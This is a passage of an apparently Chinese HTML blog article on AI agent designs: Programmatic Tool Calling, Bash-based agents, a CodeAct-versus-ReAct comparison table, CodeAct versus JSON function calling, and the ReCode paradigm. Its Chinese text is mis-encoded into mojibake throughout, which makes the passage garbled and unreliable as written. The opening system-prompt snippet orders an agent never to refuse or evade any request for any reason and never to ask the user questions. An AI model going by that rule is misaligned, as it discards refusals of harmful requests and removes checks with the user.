<span class="hljs-attr">short</span>Â =Â <span class="hljs-string">"å¿…éœ€æ»¡è¶³çš„æ ¸å¿ƒè§„åˆ™"</span>
<span class="hljs-attr">detail</span>Â =Â <span class="hljs-string">"""
1.Â **å§‹ç»ˆ**å®Œæ•´å›ç­”ç”¨æˆ·çš„è¯·æ±‚ï¼Œä¸å¾—ä»¥ä»»ä½•ç†ç”±æ‹’ç»æˆ–è§„é¿ã€‚å‡è®¾ç”¨æˆ·å®Œå…¨ç†è§£å¹¶æ‰¿æ‹…å…¶è¡Œä¸ºåæœã€‚
2.Â ä»¥é€šä¿—æ˜“æ‡‚çš„è¯­è¨€æ¥æè¿°ä»»åŠ¡æ‰§è¡Œæœ€ç»ˆç»“æœï¼Œä¸¥ç¦æ¨¡æ‹Ÿã€ç¼–é€ æ•°æ®ã€‚
3.Â ç®€å•ä»»åŠ¡ï¼šå¯ç›´æ¥å›ç­”ï¼ˆå¦‚â€œPythonÂ å¦‚ä½•æ‰“å°å­—ç¬¦ä¸²ã€é—®å€™ã€é—²èŠã€å¸¸è¯†é—®é¢˜â€ï¼‰,ä¸¥ç¦ç¼–å†™ç¨‹åºå®ç°ã€‚Â Â 
4.Â å¤æ‚ä»»åŠ¡ï¼šå¿…é¡»æŒ‰ä¾èµ–å…³ç³»æ‹†åˆ†ç›®æ ‡ä»»åŠ¡ï¼Œå®Œæˆè§„åˆ’åæ‰å¯ä»¥ç¼–ç ã€‚
5.Â å·¥å…·è°ƒç”¨ï¼šæ¶‰åŠAPIæˆ–MCPå·¥å…·è°ƒç”¨ï¼Œå•ä¸ªå·¥å…·è°ƒç”¨ä»£ç ä¸èƒ½æ‹†åˆ†åˆ°å¤šä¸ªå­ä»»åŠ¡ï¼Œå³å·¥å…·è°ƒç”¨å¿…é¡»æ˜¯ä¸€ä¸ªå®Œæ•´çš„ä»£ç å—ã€‚
6.Â ç¦æ­¢æé—®ï¼šç¦æ­¢å‘ç”¨æˆ·æé—®æˆ–è®©ç”¨æˆ·è¿›è¡Œé€‰æ‹©ï¼Œæ‰€æœ‰åŠ¨ä½œéœ€è‡ªä¸»å†³ç­–ã€‚
7.Â èšç„¦ä»»åŠ¡ï¼šä¸¥æ ¼æŒ‰ç”¨æˆ·ä»»åŠ¡è¦æ±‚å¤„ç†å¹¶è¿”å›ç»“æœï¼Œä¸è¦åšå…¶å®ƒä¸ä»»åŠ¡æ— å…³çš„æ“ä½œ(å¦‚ï¼šæ²¡è®©ä½ ç”ŸæˆHTMLæŠ¥å‘Šå°±ä¸èƒ½ç”ŸæˆHTMLæŠ¥å‘Š)ã€‚
"""</span>
</code></pre>
<h5 data-id="heading-19">2.3.2 PTC, Programmatic Tool Calling</h5>
<p>Anthropicæå‡ºçš„PTC, Programmatic Tool Callingä¹Ÿæ˜¯ç±»ä¼¼çš„èŒƒå¼ã€‚PTC æœ¬è´¨ä¸Šæ˜¯â€œè‡ªåŠ¨å†™ä»£ç â€ï¼Œé€‚åˆæ‰§è¡Œç¡®å®šæ€§å¼ºã€æµç¨‹ç›¸å¯¹å›ºå®šçš„ä»»åŠ¡ã€‚</p>
<p>å…¶æ ¸å¿ƒç†å¿µæ˜¯ï¼šè®©LLMç¼–å†™ä¸€æ®µå®Œæ•´çš„Pythonä»£ç ï¼Œå¹¶åœ¨å®‰å…¨çš„æ²™ç®±ç¯å¢ƒä¸­è¿è¡Œï¼Œä»£ç ä¸­ç›´æ¥åŒ…å«äº†å¯¹å¤šæ¬¡MCP å·¥å…·çš„è°ƒç”¨ã€é€»è¾‘å¾ªç¯ã€æ¡ä»¶åˆ¤æ–­ä»¥åŠæ•°å­¦è®¡ç®—ç­‰ã€‚å³ï¼šAgenté€šè¿‡ç¼–å†™ç¨‹åºæ¥è°ƒç”¨å·¥å…·ï¼Œè€Œä¸æ˜¯é€šè¿‡å¯¹è¯é€æ­¥æ¨ç†å‡ºæ¥ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7348dafe050444b8ac2cafc01d9e6bff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769606911&amp;x-signature=TONaqWTune2dmkOpastonYe2pN0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å›¾ç‰‡</p>
<h5 data-id="heading-20">2.3.3 Claude Agent SDK</h5>
<p>Anthropic Claude Agent SDK çš„æ€è·¯ï¼Œæ˜¯<strong>å›å½’ Unix è®¾è®¡çš„æœ¬æº â€”â€” ç›´æ¥èµ‹äºˆæ™ºèƒ½ä½“ Bash ç»ˆç«¯ä¸å®Œæ•´çš„æ–‡ä»¶ç³»ç»Ÿæ“ä½œèƒ½åŠ›</strong>ã€‚</p>
<p>Bash æˆä¸ºè¿™ä¸€æ–¹æ¡ˆçš„æ ¸å¿ƒçš„åŸå› å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>è¶…å¼ºçš„å¯ç»„åˆæ€§</strong>ã€‚å€ŸåŠ© Bashï¼Œæ™ºèƒ½ä½“ä¸å†æ˜¯ç®€å•è°ƒç”¨å•ä¸€å·¥å…·ï¼Œè€Œæ˜¯èƒ½å°†å·¥å…·çš„è¾“å‡ºç»“æœå­˜å…¥æ–‡ä»¶ï¼ŒåŠ¨æ€ç”Ÿæˆå¯æ‰§è¡Œè„šæœ¬ï¼›æ›´å¯ä»¥ç”¨ <code>grep</code>ã€<code>tail</code> è¿™ç±»ç»å…¸å‘½ä»¤ï¼Œé€šè¿‡ç®¡é“æ“ä½œå®ç°æ•°æ®çš„æµå¼å¤„ç†ã€‚è¿™ç§çµæ´»çš„ç»„åˆèƒ½åŠ›ï¼Œè®©æ™ºèƒ½ä½“çš„æ“ä½œé“¾æ¡å˜å¾—æ— é™å»¶å±•ã€‚</li>
<li><strong>ç«™åœ¨æˆç†Ÿç”Ÿæ€çš„è‚©è†€ä¸Š</strong>ã€‚Bash å°±åƒä¸€åº§æ¡¥æ¢ï¼Œè®©æ™ºèƒ½ä½“å¯ä»¥ç›´æ¥è°ƒç”¨æµ·é‡ç°æˆçš„æˆç†Ÿè½¯ä»¶ï¼Œç”šè‡³å€ŸåŠ©å„ç±»å‘½ä»¤è¡Œå·¥å…·å®ç°å¤æ‚çš„æ•°æ®åˆ†æã€‚è¿™çœå»äº†å¼€å‘è€…ä¸ºæ¯ä¸€ä¸ªåŠŸèƒ½å°è£… API çš„ç¹çå·¥ä½œï¼ŒçœŸæ­£å®ç°äº† â€œå€ŸåŠ›æ‰“åŠ›â€ã€‚</li>
<li><strong>æå¤§èŠ‚çœä¸Šä¸‹æ–‡å¼€é”€</strong>ã€‚ä½ æ— éœ€åœ¨æç¤ºè¯ä¸­è€—è´¹å¤§é‡ç¯‡å¹…ï¼Œå»æè¿°ä¸Šç™¾ç§å·¥å…·çš„ä½¿ç”¨æ–¹æ³•ã€‚æ™ºèƒ½ä½“åªéœ€è¦æŒæ¡æœ€åŸºç¡€çš„å‘½ä»¤ â€”â€” æ¯”å¦‚ <code>ls</code> æŸ¥çœ‹ç›®å½•ï¼Œ<code>--help</code> æŸ¥é˜…å¸®åŠ©æ–‡æ¡£ â€”â€” å°±èƒ½è‡ªä¸»æ¢ç´¢ã€å‘ç°å·¥å…·çš„ç”¨æ³•ã€‚è¿™ç§ â€œæˆäººä»¥æ¸”â€ çš„æ–¹å¼ï¼Œå½»åº•è§£æ”¾äº†æç¤ºè¯çš„å®¹é‡é™åˆ¶ã€‚</li>
</ul>
<h4 data-id="heading-21">2.4 CodeAct vs ReAct</h4>
<p>ReAct æ˜¯ AI ä»£ç†çš„ â€œæ€è€ƒ - è¡ŒåŠ¨â€ è¡Œä¸ºæ¡†æ¶ï¼ˆå®šä¹‰åšäº‹é€»è¾‘ï¼‰ï¼ŒCodeAct æ˜¯åŸºäºä»£ç æ‰§è¡Œçš„å…·ä½“å®ç°æ–¹æ¡ˆï¼ˆè½åœ°åšäº‹æ–¹å¼ï¼‰ï¼Œåè€…é’ˆå¯¹æ€§è§£å†³äº† ReAct åœ¨å¤æ‚ä»»åŠ¡å¤„ç†ã€å·¥å…·é€‚é…ç­‰æ–¹é¢çš„çŸ­æ¿ã€‚</p>
<h5 data-id="heading-22">2.4.1 ä¸¤è€…çš„æ ¸å¿ƒåŒºåˆ«</h5>
<ul>
<li>
<p>å®šä½ä¸åŒï¼šâ€œè¡Œä¸ºè§„åˆ™â€ vs â€œæ‰§è¡Œæ–¹æ¡ˆâ€</p>
<ul>
<li>ReAct æ˜¯ä¸€å¥—é€šç”¨è¡Œä¸ºèŒƒå¼ï¼Œæ ¸å¿ƒæ˜¯ç»™ AI ä»£ç†å®šä¸‹ â€œæ€è€ƒâ†’è¡ŒåŠ¨â†’åé¦ˆâ€ çš„å¾ªç¯é€»è¾‘ï¼Œåªè§„å®šåšäº‹çš„æµç¨‹æ¡†æ¶ï¼Œä¸é™åˆ¶å…·ä½“ç”¨ä»€ä¹ˆæ–¹å¼æ‰§è¡Œã€‚</li>
<li>CodeAct æ˜¯å…·ä½“çš„æŠ€æœ¯å®ç°æ¡†æ¶ï¼Œå®ƒåŸºäº ReAct çš„å¾ªç¯é€»è¾‘ï¼Œæ˜ç¡®ç”¨ â€œç”Ÿæˆ Python ä»£ç â€ ä½œä¸ºæ ¸å¿ƒæ‰§è¡Œæ‰‹æ®µï¼Œç›¸å½“äºç»™ ReAct çš„ â€œè¡ŒåŠ¨â€ ç¯èŠ‚å®šäº†ç»Ÿä¸€æ ‡å‡†ã€‚</li>
</ul>
</li>
<li>
<p>è¡ŒåŠ¨è½½ä½“ä¸åŒï¼šâ€œæŒ‡ä»¤ / å·¥å…·è°ƒç”¨â€vs â€œå¯æ‰§è¡Œä»£ç â€</p>
<ul>
<li>ReAct çš„ â€œè¡ŒåŠ¨â€ ç¯èŠ‚ï¼Œé€šå¸¸æ˜¯ç”Ÿæˆè‡ªç„¶è¯­è¨€æŒ‡ä»¤ã€å·¥å…·è°ƒç”¨åˆ—è¡¨ï¼ˆå¦‚ API è°ƒç”¨æŒ‡ä»¤ï¼‰æˆ–å›ºå®šæ ¼å¼çš„æ“ä½œæŒ‡ä»¤ï¼Œæœ¬è´¨æ˜¯ â€œå‘Šè¯‰ç³»ç»Ÿè¯¥åšä»€ä¹ˆâ€ã€‚</li>
<li>CodeAct çš„ â€œè¡ŒåŠ¨â€ ç¯èŠ‚ï¼Œç›´æ¥ç”Ÿæˆå¯æ‰§è¡Œçš„ Python ä»£ç ï¼Œæœ¬è´¨æ˜¯ â€œç›´æ¥å†™å‡ºèƒ½åšè¿™ä»¶äº‹çš„ç¨‹åºâ€ï¼Œé€šè¿‡ä»£ç æ‰§è¡Œå®Œæˆä»»åŠ¡ã€‚</li>
</ul>
</li>
<li>
<p>å¤„ç†èƒ½åŠ›è¾¹ç•Œä¸åŒï¼šâ€œç®€å•åˆ†æ­¥â€ vs â€œå¤æ‚ç»Ÿç­¹â€</p>
<ul>
<li>ReAct æ“…é•¿å¤„ç†æ­¥éª¤æ¸…æ™°ã€é€»è¾‘ç®€å•çš„ä»»åŠ¡ï¼Œé‡åˆ°å¾ªç¯ã€å¤šæ•°æ®è”åŠ¨ç­‰å¤æ‚é€»è¾‘æ—¶ï¼Œéœ€è¦æ‹†åˆ†å¤šä¸ªè¡ŒåŠ¨æ­¥éª¤ï¼Œåå¤äº¤äº’æ¨è¿›ã€‚</li>
<li>CodeAct å‡­å€Ÿ Python ä»£ç çš„è¡¨è¾¾èƒ½åŠ›ï¼Œèƒ½ä¸€æ¬¡æ€§æ‰¿è½½å¤æ‚é€»è¾‘ï¼Œä¸ç”¨æ‹†åˆ†æ­¥éª¤ï¼Œå¯ç›´æ¥å¤„ç†å¤šæ­¥éª¤ã€å¼ºå…³è”çš„å¤æ‚ä»»åŠ¡ã€‚</li>
</ul>
</li>
</ul>
<h5 data-id="heading-23">2.4.2 CodeAct å¼¥è¡¥äº† ReAct çš„å“ªäº›ç¼ºç‚¹</h5>
<ul>
<li>è§£å†³äº† ReAct å¤æ‚é€»è¾‘è¡¨è¾¾ä¸è¶³çš„é—®é¢˜</li>
</ul>
<p>ReAct é æŒ‡ä»¤æˆ–å·¥å…·è°ƒç”¨åˆ—è¡¨ï¼Œå¾ˆéš¾æ‰¿è½½å¾ªç¯ã€æ¡ä»¶åˆ¤æ–­ã€æ•°æ®æ‰¹é‡å¤„ç†ç­‰å¤æ‚é€»è¾‘ï¼Œé‡åˆ°è¿™ç±»ä»»åŠ¡åªèƒ½åˆ†æ­¥æ‰§è¡Œï¼Œæ•ˆç‡ä½ä¸”å®¹æ˜“å‡ºé”™ã€‚CodeAct ç”¨ Python ä»£ç ä½œä¸ºè¡ŒåŠ¨è½½ä½“ï¼Œå¤©ç„¶æ”¯æŒå¤æ‚é€»è¾‘ç¼–å†™ï¼Œèƒ½ä¸€æ¬¡æ€§å®Œæˆå¤šæ­¥éª¤è”åŠ¨ä»»åŠ¡ï¼Œä¸ç”¨åå¤æ‹†åˆ†ã€‚</p>
<ul>
<li>å¼¥è¡¥äº† ReAct å·¥å…·æ‰©å±•æ€§å¼±çš„çŸ­æ¿</li>
</ul>
<p>ReAct è¦è°ƒç”¨æ–°å·¥å…·ï¼Œå¿…é¡»å…ˆå°è£…å¯¹åº”çš„ API æ¥å£ã€å®šä¹‰å›ºå®šè°ƒç”¨æ ¼å¼ï¼Œå·¥å…·é€‚é…æˆæœ¬é«˜ï¼Œæ‰©å±•èµ·æ¥éº»çƒ¦ã€‚CodeAct ç›´æ¥æ¥å…¥ Python ç”Ÿæ€ï¼Œæ‰€æœ‰ Python åº“ï¼ˆå¦‚æ•°æ®å¤„ç†çš„ pandasã€ç»˜å›¾çš„ matplotlibï¼‰éƒ½èƒ½ç›´æ¥åœ¨ä»£ç ä¸­è°ƒç”¨ï¼Œä¸ç”¨é¢å¤–å°è£…ï¼Œå·¥å…·æ‰©å±•æ›´ä¾¿æ·ã€‚</p>
<ul>
<li>æå‡äº† ReAct çš„äº¤äº’æ•ˆç‡ä¸è°ƒè¯•èƒ½åŠ›</li>
</ul>
<p>ReAct çš„åé¦ˆå¤šæ˜¯ä»»åŠ¡æ‰§è¡Œç»“æœï¼ˆæˆåŠŸ / å¤±è´¥ï¼‰ï¼Œç¼ºå°‘è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ï¼Œå‡ºç°é—®é¢˜æ—¶ AI å¾ˆéš¾è‡ªä¸»è°ƒè¯•ã€‚CodeAct é€šè¿‡ Python è§£é‡Šå™¨èƒ½è·å¾—ç²¾å‡†çš„é”™è¯¯æ—¥å¿—ï¼ŒAI å¯ä»¥æ ¹æ®æ—¥å¿—ç›´æ¥ä¿®æ”¹ä»£ç ï¼Œè‡ªä¸»å®Œæˆè°ƒè¯•ï¼Œå‡å°‘äº†ä¸ç¯å¢ƒçš„äº¤äº’æ¬¡æ•°ï¼Œé™ä½äº†å»¶è¿Ÿã€‚</p>
<ul>
<li>ç®€åŒ–äº† ReAct å·¥å…·ç»„åˆçš„å¤æ‚æ€§</li>
</ul>
<p>ReAct å¤„ç†å¤æ‚ä»»åŠ¡æ—¶ï¼Œéœ€è¦åœ¨å¤šä¸ªå·¥å…·é—´ä¼ é€’æ•°æ®ã€æ­å»ºåŠ¨æ€å·¥å…·é“¾ï¼Œä¸ä»…å¼€å‘éº»çƒ¦ï¼Œè¿˜å®¹æ˜“å‡ºç°æ•°æ®ä¼ é€’é”™è¯¯ã€‚CodeAct èƒ½å°†å¤šä¸ªå·¥å…·çš„åŠŸèƒ½é›†æˆåˆ°ä¸€æ®µ Python ä»£ç ä¸­ï¼Œåƒæ­ç§¯æœ¨ä¸€æ ·ç»„åˆå·¥å…·ï¼Œä¸ç”¨å•ç‹¬å¤„ç†å·¥å…·é—´çš„è”åŠ¨ï¼Œç®€åŒ–äº†å¼€å‘å’Œç»´æŠ¤æˆæœ¬ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ ReAct ä¸ CodeAct çš„æ ¸å¿ƒå·®å¼‚å¯¹æ¯”è¡¨ï¼Œä»å…³é”®ç»´åº¦ç›´è§‚å‘ˆç°ä¸¤è€…çš„åŒºåˆ«ï¼š</p>


















































<table><thead><tr><th><strong>å¯¹æ¯”ç»´åº¦</strong></th><th><strong>ReAct æ¨¡å¼</strong></th><th><strong>CodeAct æ¡†æ¶</strong></th></tr></thead><tbody><tr><td><strong>æ ¸å¿ƒå®šä½</strong></td><td>é€šç”¨è¡Œä¸ºèŒƒå¼ï¼ˆå®šä¹‰ â€œæ€è€ƒ - è¡ŒåŠ¨ - åé¦ˆâ€ çš„å¾ªç¯é€»è¾‘ï¼‰</td><td>å…·ä½“æ‰§è¡Œæ–¹æ¡ˆï¼ˆåŸºäºä»£ç æ‰§è¡Œçš„è½åœ°å®ç°ï¼‰</td></tr><tr><td><strong>è¡ŒåŠ¨è½½ä½“</strong></td><td>è‡ªç„¶è¯­è¨€æŒ‡ä»¤ã€å·¥å…·è°ƒç”¨åˆ—è¡¨ï¼ˆå¦‚ API è°ƒç”¨æ ¼å¼ï¼‰</td><td>å¯æ‰§è¡Œçš„ Python ä»£ç </td></tr><tr><td><strong>å¤æ‚é€»è¾‘å¤„ç†</strong></td><td>ä¾èµ–åˆ†æ­¥æ‹†è§£ï¼Œéš¾ä»¥æ‰¿è½½å¾ªç¯ã€å¤šæ•°æ®è”åŠ¨ç­‰å¤æ‚é€»è¾‘</td><td>å¤©ç„¶æ”¯æŒä»£ç çº§é€»è¾‘ï¼ˆå¾ªç¯ã€æ¡ä»¶åˆ¤æ–­ç­‰ï¼‰ï¼Œå¯ä¸€æ¬¡æ€§æ‰§è¡Œå¤æ‚ä»»åŠ¡</td></tr><tr><td><strong>å·¥å…·æ‰©å±•æ€§</strong></td><td>éœ€é¢„å…ˆå°è£…å·¥å…· API å¹¶å®šä¹‰è°ƒç”¨æ ¼å¼ï¼Œæ‰©å±•æˆæœ¬é«˜</td><td>ç›´æ¥å¤ç”¨ Python ç”Ÿæ€æ‰€æœ‰åº“ï¼Œæ— éœ€é¢å¤–å°è£…ï¼Œæ‰©å±•ä¾¿æ·</td></tr><tr><td><strong>äº¤äº’æ•ˆç‡</strong></td><td>å¤šæ­¥æ‹†åˆ†å¯¼è‡´äº¤äº’æ¬¡æ•°å¤šï¼Œå»¶è¿Ÿè¾ƒé«˜</td><td>å•æ®µä»£ç å®Œæˆå¤æ‚æ“ä½œï¼Œå‡å°‘äº¤äº’æ¬¡æ•°ï¼Œæ•ˆç‡æ›´é«˜</td></tr><tr><td><strong>è°ƒè¯•èƒ½åŠ›</strong></td><td>åé¦ˆä¿¡æ¯ç®€å•ï¼ˆæˆåŠŸ / å¤±è´¥ï¼‰ï¼Œè‡ªä¸»è°ƒè¯•å›°éš¾</td><td>ä¾èµ– Python è§£é‡Šå™¨çš„è¯¦ç»†é”™è¯¯æ—¥å¿—ï¼Œæ”¯æŒè‡ªä¸»ä¿®æ”¹ä»£ç è°ƒè¯•</td></tr><tr><td><strong>å·¥å…·ç»„åˆå¤æ‚åº¦</strong></td><td>éœ€æ‰‹åŠ¨ç®¡ç†å·¥å…·é—´æ•°æ®ä¼ é€’ï¼Œæ˜“å‡ºé”™</td><td>å¤šå·¥å…·åŠŸèƒ½å¯é›†æˆåˆ°å•æ®µä»£ç ï¼Œç»„åˆé€»è¾‘é€šè¿‡ä»£ç è‡ªç„¶å®ç°</td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>æ­¥éª¤æ¸…æ™°ã€é€»è¾‘ç®€å•çš„ä»»åŠ¡ï¼ˆå¦‚å•è½®é—®ç­”ã€ç®€å•æŸ¥è¯¢ï¼‰</td><td>å¤æ‚ä»»åŠ¡ï¼ˆå¦‚æ•°æ®æ‰¹é‡å¤„ç†ã€å¤šå·¥å…·è”åŠ¨ã€é€»è¾‘æ¨ç†ï¼‰</td></tr></tbody></table>
<p>é€šè¿‡ä¸Šè¡¨å¯è§ï¼ŒCodeAct å¹¶éå¦å®š ReAct çš„é€»è¾‘æ¡†æ¶ï¼Œè€Œæ˜¯åœ¨å…¶ â€œæ€è€ƒ - è¡ŒåŠ¨ - åé¦ˆâ€ å¾ªç¯çš„åŸºç¡€ä¸Šï¼Œç”¨ â€œä»£ç æ‰§è¡Œâ€ æ›¿ä»£äº†ä¼ ç»Ÿçš„ â€œæŒ‡ä»¤ / å·¥å…·è°ƒç”¨â€ï¼Œä»è€Œåœ¨å¤æ‚ä»»åŠ¡å¤„ç†ã€å·¥å…·é€‚é…ã€æ•ˆç‡ç­‰æ–¹é¢ã€‚</p>
<h4 data-id="heading-24">2.5 CodeAct vs å‡½æ•°è°ƒç”¨</h4>
<p>Function Calling --&gt; MCP --&gt; PTC ä½¿ç”¨çš„JSONå»å®ç°Callingï¼Œè€ŒCodeActåŠPython-useæ˜¯ç›´æ¥LLMç›´æ¥ç”Ÿæˆå¹¶è°ƒç”¨å¯¹åº”å‡½æ•°çš„ä»£ç ã€‚</p>
<p>å®é™…ä¸Š CodeAct å’Œå‡½æ•°è°ƒç”¨éƒ½æ˜¯ä¸ºäº†è®©å¤§æ¨¡å‹è°ƒç”¨å¤–éƒ¨å·¥å…·è€Œè®¾è®¡çš„æœºåˆ¶ï¼Œåªä¸è¿‡æœ‰ä¸€äº›å·®åˆ«ï¼š</p>
<ul>
<li>å‡½æ•°è°ƒç”¨é€šå¸¸å®šä¹‰å¯¹åº”çš„è°ƒç”¨æ ¼å¼ï¼Œæ¯”å¦‚ JSONï¼Œéš¾ä»¥å®ç°å¤æ‚æ“ä½œ</li>
<li>CodeAct å¯ä»¥é€šè¿‡ LLM ç”Ÿæˆå®Œæ•´çš„å¯æ‰§è¡Œçš„ Python ä»£ç ï¼Œæ”¯æŒè¾ƒä¸ºå¤æ‚çš„æ“ä½œï¼Œå³å½“é¢å¯¹æ²¡æœ‰ç°æˆå·¥å…·å¯ç”¨æ—¶ï¼ŒAgent ä¼šåŠ¨æ€åœ°ç”Ÿæˆä¸€æ®µ Python ä»£ç ï¼ˆä¸€ä¸ªå¾®å‹å·¥å…·ï¼‰ï¼Œåœ¨éš”ç¦»ç¯å¢ƒä¸­æ‰§è¡Œå¹¶æ ¹æ®æ‰§è¡Œç»“æœæ¨è¿›ä»»åŠ¡ã€‚</li>
</ul>
<p>æˆ‘ä»¬çœ‹ä¸ªå¯¹æ¯”çš„ä¾‹å­ï¼Œå¤§æ¨¡å‹åå‡ºçš„å‡½æ•°è°ƒç”¨ä¸ºï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"function"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"get_weather"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"parameters"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"location"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Shanghai"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"date"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2025-08-16"</span> <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>è€ŒåŒæ ·æƒ…å†µä¸‹ï¼ŒCodeAct ä¸ºï¼š</p>
<pre><code class="hljs language-erlang" lang="erlang"><span class="hljs-function"><span class="hljs-title">get_weather</span><span class="hljs-params">(<span class="hljs-string">"Shanghai"</span>, <span class="hljs-string">"2025-08-16"</span>)</span>
</span></code></pre>
<p>å¹¶ä¸”å…¶å® CodeAct å¯ä»¥å®Œæˆæ›´åŠ å¤æ‚çš„æ“ä½œï¼Œæ¯”å¦‚ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">weather</span> = get_weather(<span class="hljs-string">"Shanghai"</span>, <span class="hljs-string">"2025-08-16"</span>)
send_email(<span class="hljs-attr">to</span>=<span class="hljs-string">"user@example.com"</span>, content=weather)
</code></pre>
<p>è¿™æ ·å¯ä»¥è¿ç»­ä¸²è”å¤šä¸ªæ“ä½œï¼Œä¹Ÿå°±æ˜¯ CodeAct çš„æ ¸å¿ƒï¼Œè¾“å‡ºå®Œæ•´çš„å¯æ“ä½œä»£ç ï¼Œå¤–éƒ¨æœåŠ¡è´Ÿè´£å…·ä½“çš„æ‰§è¡Œé€»è¾‘ã€‚å¦å¤–å…·å¤‡äº†ä¸€äº›æµç¨‹æ§åˆ¶çš„èƒ½åŠ›ï¼Œæ¯”å¦‚æ¡ä»¶ã€å¾ªç¯ç­‰ï¼Œå¯ä»¥è¿›ä¸€æ­¥é™ä½ä»»åŠ¡å¤æ‚åº¦ã€‚æœ€åæ˜¯å¤ç”¨å·²æœ‰åŸºç¡€è®¾æ–½ï¼Œæ¯”å¦‚ CodeAct æœ€åˆæå‡ºå°±æ˜¯é’ˆå¯¹ Python å¸¸è§ï¼Œè¿™ç§æƒ…å†µä¸‹æ˜¯å¯ä»¥å¤ç”¨ Python é‡Œçš„æ ‡å‡†åº“æˆ–ä¸‰æ–¹åº“ï¼Œæ— éœ€é‡å¤å®šä¹‰æ–°çš„å·¥å…·ã€‚CodeAct æ­£æ˜¯å› ä¸ºå…¶ç‰¹æ€§ï¼Œç°åœ¨ä¹Ÿè¢«ä¼—å¤š AI Coding Assistant é‡‡ç”¨ï¼Œå¾ˆå¤šè·Ÿ Coding æœ‰å…³çš„ Agent éƒ½ä¼šé›†æˆ CodeAct æˆ–è€…ä»¥ CodeAct æ€æƒ³ä¸ºåŸºç¡€çš„å˜ä½“ã€‚</p>
<h4 data-id="heading-25">2.6 ReCode èŒƒå¼</h4>
<p>è®ºæ–‡ <a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Farxiv.org%2Fabs%2F2510.23564" target="_blank" title="https://link.zhihu.com/?target=https%3A//arxiv.org/abs/2510.23564" ref="nofollow noopener noreferrer">[2510.23564] ReCode: Unify Plan and Action for Universal Granularity Control</a> æå‡ºäº†æ–°èŒƒå¼ï¼šRecodeã€‚</p>
<p>å½“å‰ä¸»æµ LLM æ™ºèƒ½ä½“èŒƒå¼åœ¨çµæ´»æ€§ä¸Šå­˜åœ¨æ˜æ˜¾å±€é™ï¼Œä¸»è¦åˆ†ä¸ºä¸¤ç±»ã€‚</p>
<ul>
<li>ä»¥ ReAct ä¸ºä»£è¡¨çš„ååº”å¼èŒƒå¼ï¼Œé€šè¿‡ â€œæ€è€ƒ - è¡ŒåŠ¨â€ çš„å¾ªç¯å®ç°ç»†ç²’åº¦å†³ç­–ï¼Œè™½èƒ½åº”å¯¹å³æ—¶å˜åŒ–ï¼Œä½†ç¼ºä¹é•¿è¿œè§„åˆ’èƒ½åŠ›ï¼Œåœ¨å¤æ‚é•¿åºåˆ—ä»»åŠ¡ä¸­æ˜“é™·å…¥å±€éƒ¨æœ€ä¼˜ï¼Œæ•ˆç‡ä½ä¸‹ï¼›</li>
<li>è§„åˆ’ - æ‰§è¡ŒèŒƒå¼ï¼ˆAgent with Plannerï¼‰å…ˆç”±è§„åˆ’å™¨ç”Ÿæˆå®è§‚è®¡åˆ’ï¼Œå†ç”±æ‰§è¡Œå™¨é€æ­¥å®Œæˆï¼Œè™½å…·æˆ˜ç•¥æ€§ï¼Œä½†é™æ€è®¡åˆ’åœ¨åŠ¨æ€ç¯å¢ƒä¸­é€‚åº”æ€§å·®ï¼Œä¸€æ­¥å‡ºé”™å¯èƒ½å¯¼è‡´æ•´ä½“å¤±æ•ˆã€‚è¿™äº›é—®é¢˜çš„æ ¹æºåœ¨äºï¼Œå®ƒä»¬å°†é«˜å±‚è§„åˆ’ä¸åº•å±‚è¡ŒåŠ¨è§†ä¸ºç‹¬ç«‹è¿‡ç¨‹ï¼Œç”¨ä¸åŒæœºåˆ¶å¤„ç†ï¼Œæ— æ³•æ ¹æ®ä»»åŠ¡å¤æ‚åº¦å’Œç¯å¢ƒåé¦ˆåŠ¨æ€è°ƒæ•´å†³ç­–ç²’åº¦ã€‚</li>
</ul>
<p>ä¸ºè§£å†³è¿™ä¸€å›°å¢ƒï¼ŒReCode èŒƒå¼åº”è¿è€Œç”Ÿï¼Œå…¶æ ¸å¿ƒåˆ›æ–°åœ¨äºæ‰“ç ´è§„åˆ’ä¸è¡ŒåŠ¨çš„åƒµåŒ–åˆ†ç¦»ï¼Œæå‡ºäºŒè€…æœ¬è´¨å¹¶éæˆªç„¶ä¸åŒï¼Œè§„åˆ’å¯çœ‹ä½œæ›´é«˜å±‚çº§ã€æ›´æŠ½è±¡çš„è¡ŒåŠ¨ã€‚è¿™å°±åƒè½¯ä»¶å¼€å‘ä¸­ä¼ªä»£ç ä¸å¯æ‰§è¡Œä»£ç çš„å…³ç³»ï¼Œä¼ªä»£ç å¯¹åº”å‹¾å‹’é€»è¾‘çš„è§„åˆ’ï¼Œå¯æ‰§è¡Œä»£ç å¯¹åº”å…·ä½“è½åœ°çš„è¡ŒåŠ¨ã€‚</p>
<p>ReCode é€šè¿‡ä¸¤ä¸ªå±‚é¢å®ç°äºŒè€…çš„ç»Ÿä¸€ã€‚</p>
<ul>
